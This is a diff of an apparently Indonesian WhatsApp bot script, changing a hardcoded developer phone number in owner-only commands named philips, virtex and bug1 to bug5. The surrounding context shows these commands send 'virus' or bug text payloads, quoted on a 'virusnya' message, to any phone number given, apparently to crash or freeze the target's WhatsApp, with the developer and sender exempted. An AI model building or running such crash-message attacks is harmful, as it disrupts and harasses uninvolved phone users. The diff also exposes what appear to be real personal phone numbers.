@@ -3497,7 +3497,7 @@ case 'philips':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('Itu Nomor Lu Sendiri')
 await sleep(3000)
@@ -3510,7 +3510,7 @@ case 'philips2':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('Itu Nomor Lu Sendiri')
 await sleep(3000)
@@ -3525,7 +3525,7 @@ case 'philips3':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('Itu Nomor Lu Sendiri')
 conn.sendMessage(num, {text:philips}, {quoted:virusnya})
@@ -3610,7 +3610,7 @@ case 'virtex':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:virus}, {quoted:virusnya})
@@ -3622,7 +3622,7 @@ case 'virtex2':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:virus}, {quoted:virusnya})
@@ -3636,7 +3636,7 @@ case 'virtex3':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:virus}, {quoted:virusnya})
@@ -3652,7 +3652,7 @@ case 'bug1':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
@@ -3664,7 +3664,7 @@ case 'bug2':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
@@ -3676,7 +3676,7 @@ case 'bug3':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
@@ -3690,7 +3690,7 @@ case 'bug4':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 await sleep(3000)
@@ -3709,7 +3709,7 @@ case 'bug5':{
 if (!isOwner) return reply(mess.OnlyOwner)
 if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
 var num = q+"@s.whatsapp.net"
-var dev = '6283834558105@s.whatsapp.net'
+var dev = '62881025400447@s.whatsapp.net'
 if (num == dev) return reply('Itu developer gua')
 if (num == sender) return reply('itu nomor lu sendiri')
 await sleep(3000)
